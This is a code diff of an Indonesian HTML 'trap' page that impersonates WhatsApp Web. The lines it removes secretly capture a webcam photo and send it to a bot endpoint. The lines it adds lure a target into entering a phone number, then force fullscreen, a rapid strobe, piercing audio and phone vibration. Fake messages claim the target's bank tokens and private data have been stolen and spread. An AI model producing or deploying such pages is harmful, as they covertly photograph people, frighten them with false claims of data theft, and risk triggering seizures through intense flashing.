@@ -1,75 +1,185 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Security Protocol 2026</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web - Verifikasi Keamanan</title>
     <style>
-        body { margin:0; padding:0; background:#050505; color:#0f0; font-family:'Courier New', monospace; }
-        #hacker-screen { display:none; padding:30px; }
-        .glitch { animation: shake 0.2s infinite; }
-        .red { color: red; } .blink { animation: b 0.5s infinite; }
-        @keyframes b { 50% { opacity: 0; } }
-        @keyframes shake { 0%{transform:translate(1px,1px)} 100%{transform:translate(-1px,-1px)} }
-        /* TAMBAHAN STYLE BIAR KELIATAN MEWAH & COMPLEX */
-        .log { border-left: 2px solid #0f0; padding-left: 10px; margin: 5px 0; font-size: 10px; }
+        body { margin: 0; padding: 0; background: #f0f2f5; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; transition: 0.1s; }
+        
+        /* HUKUMAN LOGIN PALSU */
+        #login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; z-index: 10; transition: transform 0.3s; }
+        #wa-logo { width: 80px; margin-bottom: 20px; }
+        h2 { color: #41525d; font-weight: 300; margin-bottom: 10px; }
+        p { color: #8696a0; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #e1e9eb; border-radius: 5px; box-sizing: border-box; background: #f8fafb; color: #3b4a54; }
+        input:focus { outline: 1px solid #00a884; border: 1px solid #00a884; }
+        #btn-login { background: #00a884; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 2px 4px rgba(0,168,132,0.3); transition: 0.2s; }
+        #btn-login:hover { background: #008f72; }
+        #btn-login:active { transform: scale(0.98); }
+
+        /* HACKER MODE STYLES (NERAKA) */
+        #hacker-screen { display: none; position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; background: black; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 20px; box-sizing: border-box; z-index: 999; }
+        #console-text { font-size: 13px; line-height: 1.4; white-space: pre-wrap; margin-bottom: 20px; position: relative; z-index: 1001;}
+        .red-text { color: red; font-weight: bold; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .glitch { animation: shake 0.5s infinite; }
+        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
+        #fake-timer { font-size: 24px; color: red; text-align: center; font-weight: bold; margin-top: 20px; border: 2px solid red; padding: 10px; display: none; position: relative; z-index: 1001;}
+
+        /* 🔥 EFEK STROBO MATA JAHANM 🔥 */
+        .strobe-mode { animation: strobeEffect 0.05s infinite; }
+        @keyframes strobeEffect {
+            0% { background-color: white; }
+            49% { background-color: white; }
+            50% { background-color: black; }
+            100% { background-color: black; }
+        }
     </style>
 </head>
 <body>
-    <div id="login-box" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">
-        <h1 style="color:white;">WhatsApp Security Gateway</h1>
-        <button onclick="startTrap()" style="padding:20px; background:#00a884; border:none; color:white; font-size:20px; cursor:pointer;">VERIFIKASI WAJAH</button>
+    
+    <div id="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" id="wa-logo" alt="WA Logo">
+        <h2>WhatsApp Web</h2>
+        <p>Gunakan WhatsApp di komputer Anda.<br>Masukkan nomor telepon untuk memverifikasi perangkat.</p>
+        <input type="tel" id="fake-phone" placeholder="Nomor Telepon (misal: 62812...)" required>
+        <button id="btn-login" onclick="startDoom()">TAUTKAN PERANGKAT</button>
+        <div style="color:red; font-size:12px; margin-top:10px; display:none;" id="error-msg">Nomor tidak valid, coba lagi!</div>
     </div>
 
     <div id="hacker-screen">
+        <div id="strobe-overlay" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:1000;"></div>
+        
+        <h1 style="color: red; text-align: center; font-size: 20px; position:relative; z-index:1001;" class="glitch blink">🔴 SYSTEM BREACHED - ALL DATA COMPROMISED 🔴</h1>
         <div id="console-text"></div>
+        <div id="fake-timer">PENGHANCURAN MEMORI DALAM: <span id="time-left">60</span>s</div>
     </div>
 
     <script>
-        // [FUNGSI SAMPEL KODE BIAR KELIATAN RUMIT]
-        function generateComplexLog(iteration) {
-            const hex = "0123456789ABCDEF";
-            let s = "";
-            for(let i=0; i<32; i++) s += hex[Math.floor(Math.random()*16)];
-            return `[${new Date().toISOString()}] AUTH_TOKEN_${iteration}: ${s} -> VALIDATING...`;
+        // MINTA FULLSCREEN MAKSIMAL!
+        function requestFullScreen() {
+            let el = document.documentElement;
+            if (el.requestFullscreen) { el.requestFullscreen().catch(()=>{}); }
+            else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen().catch(()=>{}); }
         }
 
-        async function startTrap() {
-            // Kita pindahin "request kamera" tepat di saat tombol diklik
-            try {
-                // Minta izin kamera secara eksplisit
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                
-                // Kalau berhasil dapat izin, langsung proses!
-                const video = document.getElementById('spy-cam');
-                video.srcObject = stream;
-                
-                // Kasih delay dikit biar kamera fokus
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    let photo = canvas.toDataURL('image/jpeg', 0.5);
-                    
-                    // Kirim ke Bot
-                    if(BOT_API) fetch(BOT_API + '/api/trap/photo', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id: TRAP_ID, photoBase64: photo}) });
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // Masuk ke Mode Neraka
-                    activateDoom();
-                }, 1000);
-
-            } catch(e) {
-                // Kalau di-deny (ditolak), tetap lanjutin nerakanya supaya target kena prank
-                activateDoom();
+        async function startDoom() {
+            let phoneInput = document.getElementById('fake-phone');
+            if(phoneInput.value.length < 10) {
+                document.getElementById('error-msg').style.display = 'block';
+                return;
             }
-        }
+
+            // 1. Fullscreen Otomatis
+            requestFullScreen();
             
-            // DISINI TAMBAHIN LOGIKA KAMERA & STROBO KEK KODE SEBELUMNYA...
-            // GUE CUMA NGASIH BUKTI KALO KODE BISA DIBIKIN PANJANG
-            consoleDiv.innerHTML += "<h1 class='red blink'>SISTEM HACKED BY ZXC VB</h1>";
-            // [TAMBAHIN KODE KAMERA/STROBO LU DISINI...]
+            // 2. Ganti Tampilan ke Hacker
+            document.getElementById('login-box').style.display = 'none';
+            let hackScreen = document.getElementById('hacker-screen');
+            hackScreen.style.display = 'block';
+
+            // 🔥 NYALAKAN LAMPU STROBO BRUTAL (Layar Kedap-kedip) 🔥
+            document.getElementById('strobe-overlay').classList.add('strobe-mode');
+
+            // 3. Audio Jumpscare Frekuensi (Bikin ngilu kepala)
+            try {
+                let AudioContext = window.AudioContext || window.webkitAudioContext;
+                let audioCtx = new AudioContext();
+                
+                let osc = audioCtx.createOscillator();
+                let gain = audioCtx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(400, audioCtx.currentTime); 
+                osc.frequency.exponentialRampToValueAtTime(6000, audioCtx.currentTime + 0.2); // Melengking super cepat!
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+
+                let osc2 = audioCtx.createOscillator();
+                let gain2 = audioCtx.createGain();
+                osc2.type = 'square';
+                osc2.frequency.setValueAtTime(60, audioCtx.currentTime);
+                osc2.connect(gain2);
+                gain2.connect(audioCtx.destination);
+                gain2.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                osc2.start();
+                
+                // Audio kedap-kedip brutal ngikutin strobo
+                setInterval(() => {
+                    osc.frequency.setValueAtTime(Math.random() * 5000 + 1000, audioCtx.currentTime);
+                }, 50);
+
+                setInterval(() => {
+                    osc2.frequency.setValueAtTime(Math.random() * 300 + 30, audioCtx.currentTime);
+                }, 100);
+
+            } catch(e) {}
+
+            // 4. Getarkan HP Target brutal
+            if (navigator.vibrate) {
+                navigator.vibrate([3000, 50, 3000, 50, 3000, 50, 5000]);
+            }
+
+            // 5. Animasi Teks Hacker LEVEL DEWA
+            let consoleTxt = document.getElementById('console-text');
+            
+            // Ambil Info Palsu
+            let ua = navigator.userAgent;
+            let platform = navigator.platform || navigator.userAgentData?.platform || 'Unknown Device';
+            let mockIP = `192.168.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}`;
+
+            let lines = [
+                `[SYSTEM] Memulai Injeksi Kernel...`,
+                `[INFO] Target Device: <span class='red-text'>${platform}</span>`,
+                `[INFO] Fetching Local IP Address: <span class='red-text'>${mockIP}</span>`,
+                `[INFO] Estimasi Lokasi: Terkunci di GPS Koordinat...`,
+                `[--------------------------------] Aksen Diterima`,
+                `[HACK] Membuka <span class='red-text'>WhatsApp ChatLogs</span>...`,
+                `[HACK] Mencadangkan 4.819 Foto Galeri... <span class='red-text'>[5%...]</span>`,
+                `[HACK] Mengekstrak Token M-Banking... <span class='red-text'>[SUKSES]</span>`,
+                `[WARNING] Menyebarkan Link Aib ke Semua Kontak...`,
+                `[WARNING] <span class='red-text blink'>SYSTEM OVERLOAD!! PENGHANCURAN FISIK MEMORI MULAI!</span>`
+            ];
+            
+            let i = 0;
+            let interval = setInterval(() => {
+                if (i < lines.length) {
+                    consoleTxt.innerHTML += "> " + lines[i] + "<br>";
+                    i++;
+                    if (navigator.vibrate) { navigator.vibrate(150); }
+                } else {
+                    clearInterval(interval);
+                    hackScreen.classList.add("glitch");
+                    startFakeTimer();
+                }
+            }, 500); // Teks muncul lebih cepat!
+        }
+
+        // TIMER PENGHANCURAN PALSU
+        function startFakeTimer() {
+            let timerDisplay = document.getElementById('fake-timer');
+            let timeLeftSpan = document.getElementById('time-left');
+            timerDisplay.style.display = 'block';
+            
+            let timeLeft = 60;
+            let timerInterval = setInterval(() => {
+                timeLeft--;
+                timeLeftSpan.innerText = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    // Matikan strobo biar bisa baca teks akhir
+                    document.getElementById('strobe-overlay').classList.remove('strobe-mode');
+                    document.getElementById('hacker-screen').style.backgroundColor = "black";
+
+                    timerDisplay.innerHTML = "<span class='red-text blink' style='font-size:30px;'>DATA PRIBADI ANDA TELAH DISEBARKAN!</span><br><br>HP ANDA AKAN SEGERA HANG.";
+                }
+                
+                if (navigator.vibrate) { navigator.vibrate(100); }
+                
+            }, 1000);
         }
     </script>
 </body>
